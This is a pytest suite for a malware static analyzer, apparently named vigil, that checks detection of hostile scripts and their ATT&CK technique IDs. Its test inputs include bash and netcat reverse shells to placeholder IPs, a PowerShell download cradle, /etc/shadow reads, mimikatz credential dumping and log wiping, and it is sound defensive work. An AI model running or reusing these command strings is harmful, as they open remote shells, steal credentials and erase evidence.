import base64

from vigil.deobfuscator import deobfuscate
from vigil import static_analyzer as sa


def analyze(text):
    return sa.analyze(deobfuscate(text), use_yara=False)


def names(result):
    return {f.name for f in result.findings}


def test_detects_reverse_shell():
    r = analyze("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")
    assert "reverse_shell_bash" in names(r)
    assert any(f.category == "c2" for f in r.findings)


def test_detects_powershell_download_cradle():
    r = analyze("IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    assert "powershell_iex" in names(r)
    assert "net_webclient_download" in names(r)


def test_detects_credential_file_access():
    r = analyze("cat /etc/shadow > /tmp/loot")
    assert "unix_credential_files" in names(r)
    assert any(f.attack_id and f.attack_id.startswith("T1003") for f in r.findings)


def test_detects_scheduled_task_persistence():
    r = analyze("schtasks /create /tn evil /tr calc.exe /sc onlogon")
    assert "scheduled_task" in names(r)


def test_findings_carry_layer_provenance():
    payload = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
    blob = base64.b64encode(payload.encode()).decode()
    r = analyze(f"echo {blob} | base64 -d | bash")
    rs = [f for f in r.findings if f.name == "reverse_shell_bash"]
    assert rs
    assert any(f.layer_id > 0 for f in rs)  # found in a decoded layer


def test_matched_string_is_recorded():
    r = analyze("mimikatz sekurlsa::logonpasswords")
    creds = [f for f in r.findings if f.name == "credential_dumping"]
    assert creds
    assert creds[0].matched


def test_benign_script_no_findings():
    r = analyze("#!/bin/bash\necho hello\ndate\nls -la\n")
    assert r.findings == []


def test_degrades_without_yara_with_note():
    # use_yara=True but rules may be absent / yara-python may be missing;
    # either way this must not crash and must still run pattern detection.
    r = sa.analyze(deobfuscate("iex(malicious)"), use_yara=True)
    assert isinstance(r.findings, list)
    if not r.yara_used:
        assert any("pattern detection only" in n for n in r.notes)


def test_hostile_input_does_not_crash():
    for bad in ["", "\x00\x01", "A" * 10000, "%%%", "iex(" * 500]:
        sa.analyze(deobfuscate(bad), use_yara=False)


# --- ATT&CK mapping correctness -------------------------------------------
# These pin the technique ids so a mislabelled mapping is caught by the suite
# rather than by a reader. Raw-socket shells are T1095 (Non-Application Layer
# Protocol), NOT T1071 (Application Layer Protocol).

def _attack_for(result, name):
    return next(f.attack_id for f in result.findings if f.name == name)


def test_raw_socket_shells_map_to_t1095_not_t1071():
    r = analyze("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")
    assert _attack_for(r, "reverse_shell_bash") == "T1095"
    r2 = analyze("nc -e /bin/sh 203.0.113.9 4444")
    assert _attack_for(r2, "reverse_shell_nc") == "T1095"


def test_c2_socket_techniques_are_internally_consistent():
    """reverse_shell_* and socket_backconnect describe the same concept and
    must not carry different technique ids."""
    r = analyze("bash -i >& /dev/tcp/1.2.3.4/53 0>&1\nimport socket\nsocket.socket()")
    ids = {f.attack_id for f in r.findings if f.category == "c2"}
    assert ids == {"T1095"}, ids


def test_log_deletion_is_separate_from_history_clearing():
    hist = analyze("history -c; rm ~/.bash_history")
    assert _attack_for(hist, "clear_shell_history") == "T1070.003"
    logs = analyze("rm -rf /var/log/auth.log")
    assert _attack_for(logs, "clear_unix_system_logs") == "T1070.002"


def test_hidden_window_and_policy_bypass_are_distinct():
    r = analyze("powershell.exe -w hidden -ep bypass -c whoami")
    assert _attack_for(r, "powershell_hidden_window") == "T1564.003"
    assert _attack_for(r, "powershell_policy_bypass") == "T1562.001"


def test_every_pattern_has_a_wellformed_attack_id():
    import re
    for name, _cat, aid, _sev, _rx in sa._PATTERNS:
        assert aid is None or re.fullmatch(r"T\d{4}(\.\d{3})?", aid), (name, aid)


# --- YARA path (skipped when yara-python is absent) ------------------------

def test_yara_rules_compile_and_match_over_layers():
    """Guards against the YARA path silently never executing."""
    import pytest
    if not sa._YARA_AVAILABLE:
        pytest.skip("yara-python not installed")
    rules = sa.compile_yara()
    assert rules is not None, "shipped rules/ failed to compile"

    payload = "nc -e /bin/sh 203.0.113.9 4444"
    blob = base64.b64encode(payload.encode()).decode()
    result = sa.analyze(deobfuscate(f"echo {blob} | base64 -d | sh"),
                        use_yara=True)
    assert result.yara_used is True
    yara_hits = [f for f in result.findings if f.engine == "yara"]
    assert yara_hits, "YARA compiled but matched nothing"
    # matched inside a decoded layer, not just the source
    assert any(f.layer_id > 0 for f in yara_hits)


def test_yara_rule_metadata_agrees_with_pattern_table():
    import pytest
    if not sa._YARA_AVAILABLE:
        pytest.skip("yara-python not installed")
    r = sa.analyze(deobfuscate("nc -e /bin/sh 1.2.3.4 4444"), use_yara=True)
    for f in r.findings:
        if f.name == "reverse_shell_unix":
            assert f.attack_id == "T1095"
